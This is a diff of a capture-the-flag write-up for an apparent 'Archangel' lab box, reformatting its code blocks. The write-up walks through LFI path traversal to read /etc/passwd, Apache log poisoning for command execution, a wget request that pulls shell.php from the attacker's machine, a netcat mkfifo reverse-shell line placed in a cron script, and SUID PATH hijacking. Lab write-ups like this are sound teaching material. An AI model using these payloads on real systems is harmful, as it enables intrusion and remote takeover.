@@ -27,7 +27,7 @@ Path to accomplish the CTF:
 
 
 * Nmap Report:
-  ```sh linenums="1" hl_lines="6 11"
+  ```s linenums="1" hl_lines="6 11"
     # Nmap 7.93 scan initiated Mon Feb 20 01:06:35 2023 as: nmap -sC -sV -O -oN nmap.txt 10.10.45.108
     Nmap scan report for 10.10.45.108
     Host is up (0.15s latency).
@@ -66,7 +66,7 @@ Path to accomplish the CTF:
 
 As a part of Enumeration, I began by scanning the website on port 80 and stumbled upon a `wavefire` template. But thankfully, this led me to the domain name {=="mafialive.thm"==}, which I added to my `/etc/hosts` file and accessed via the domain name.
 
-``` sh linenums="1"
+``` s linenums="1"
 127.0.0.1 localhost
 127.0.1.1 kali
 10.10.180.241 team.thm
@@ -86,7 +86,7 @@ Upon accessing the page, I discovered `flag-1`
 
 But there was nothing noteworthy beyond that. As a result, I executed the ```dirsearch``` script to locate hidden directories and files. Here, I discovered <b>/test.php</b> and accessed it.
 
-``` sh linenums="1" hl_lines="31"
+``` s linenums="1" hl_lines="31"
 Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927
 
 Output File: /home/kali/.dirsearch/reports/mafialive.thm/_23-02-21_09-38-53.txt
@@ -181,13 +181,13 @@ Upon decoding the result, I was able to successfully access the ```test.php``` f
 
 The restrictions placed on the "view" parameter are evident; specifically, the string {++var/www/html/development_testing++} was allowed, while any occurrence of ../.. was not permitted. Through reverse engineering, I found a way to bypass these limitations, resulting in the following modified command.
 
-```sh
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd
+```http
+ GET /test.php?view=/var/www/html/development_testing/..//..//..//../etc/passwd HTTP/1.1
 ```
 
 That was working, and It gave me the results.
 
-```sh linenums="1" hl_lines="26"
+```s linenums="1" hl_lines="26"
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 bin:x:2:2:bin:/bin:/usr/sbin/nologin
@@ -220,8 +220,8 @@ archangel:x:1001:1001:Archangel,,,:/home/archangel:/bin/bash
 
 I saw an opportunity to explore further and decided to try a different file. In the context of Local File Inclusion (LFI), the remote files cannot be accessed, but it is possible to modify the contents of local files. This provided an opening to execute a straightforward PHP script on log files.
 
-```
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log
+```http
+GET /test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log HTTP/1.1
 ```
 
 The server is configured to use Apache, which usually stores its log files in the directory `/var/log/apache2/access.log.` By utilizing the PHP command: 
@@ -237,8 +237,8 @@ we could pass commands as an argument through ```cmd``` and successfully execute
 
 I though of a plan to download a reverse shell onto the server by utilizing the "cmd" argument. The command was structured as follows: 
 
-```
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20%20http://10.17.3.217:8000/shell.php
+```http
+GET /test.php?view=/var/www/html/development_testing/..//..//..//../var/log/apache2/access.log&cmd=wget%20%20http://10.17.3.217:8000/shell.php HTTP/1.1
 ```
 !!! note 
     I had a local Python HTTP server beforehand.
@@ -253,8 +253,8 @@ http://mafialive.thm/test.php?view=/var/www/html/development_testing/..//..//../
 
 Subsequently, I accessed 
 
-```
-http://mafialive.thm/test.php?view=/var/www/html/development_testing/shell.php
+```http
+GET /test.php?view=/var/www/html/development_testing/shell.php HTTP/1.1
 ```
 which enabled me to gain initial access. Using this access, I successfully located the flag-3 at "/home/archangel/user.txt"
 
@@ -266,14 +266,16 @@ which enabled me to gain initial access. Using this access, I successfully locat
 
 Afterwards, I was able to escalate my privileges horizontally for the user ``archangel``. By running the ``linpeas.sh`` script, I discovered that there was a cron job running with the following configuration:
 
-```sh
+```s
 */1 * * * * archangel /opt/helloworld.sh
 ```
 
 This presented an opportunity to execute a reverse shell. To do so, I modified the code within the `helloworld.sh` file to include the following command:
 
 !!! Bug "Reverse Shell Command"
-    <span>echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5433" > /opt/helloworld.sh</span>
+    ```s
+    echo "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.17.3.217 5433" > /opt/helloworld.sh
+    ```
 
 As a result of this change, I was able to successfully execute a reverse shell and obtain the flag-4 located at 
 ~/secret/user2.txt
@@ -288,7 +290,7 @@ As a result of this change, I was able to successfully execute a reverse shell a
 
 Upon gaining access to the ```archangel``` account, I was keen to identify any binaries with SUID permissions since I lacked passwords for any of the users. Consequently, I ran the following command:
 
-``` sh linenums="1" hl_lines="18"
+``` s linenums="1" hl_lines="18"
 find / -type f -perm -04000 -ls 2>/dev/null
 
 392217     40 -rwsr-xr-x   1 root     root        40344 Mar 23  2019 /usr/bin/newgrp
@@ -312,13 +314,13 @@ find / -type f -perm -04000 -ls 2>/dev/null
 
 During the search, I noticed that the ```/home/archangel/secret/``` directory appeared suspicious. Further investigation revealed the presence of an `ELF binary` with the SUID bit set. I used the `strings` command to examine its content, which indicated that the binary was copying files using the following command:
 
-``` sh
+``` s
 cp /home/user/archangel/myfiles/* /opt/backupfiles
 ```
 
 However, since the path did not exist, it was unlikely that the program would run successfully. To exploit this vulnerability, I created a `cp` binary file in the` /tmp` directory and added the path to it as follows:
 
-``` sh
+``` s
 export PATH="/tmp:$PATH"
 ```
 
@@ -331,7 +333,7 @@ With this modification, I was able to execute the "cp" command with the SUID per
 - [x] Flag 5: Root Flag
 
 !!! success
-    and from there, I had peace upon me! 
+    <span>and from there, I had peace upon me!</span>
   
 <script>
 
